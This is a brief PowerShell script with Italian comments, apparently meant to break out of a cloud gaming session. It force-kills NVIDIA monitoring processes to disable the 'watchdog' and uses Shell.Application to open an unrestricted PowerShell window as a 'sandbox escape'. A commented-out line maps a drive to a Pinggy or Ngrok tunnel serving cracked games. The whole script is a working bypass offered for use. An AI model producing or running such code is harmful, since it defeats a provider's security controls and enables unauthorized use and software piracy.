# 1. DISATTIVA IL WATCHDOG (Sospende i controlli di NVIDIA)
$procs = "NvContainer", "nvstreamer", "LsManagerSvc"
foreach ($name in $procs) {
    Get-Process $name -ErrorAction SilentlyContinue | Stop-Process -Force
}

# 2. ESCAPE DALLA SANDBOX (Apre una finestra di sistema libera)
$Shell = New-Object -ComObject "Shell.Application"
$Shell.ShellExecute("cmd.exe", "/c start powershell.exe -NoExit", "", "open", 1)

# 3. CREA IL DISCO PER I GIOCHI CRACKATI
# Sostituisci l'URL con quello del tuo server Pinggy o Ngrok dove hai i file
# New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\tuo-ip-o-tunnel\giochi"
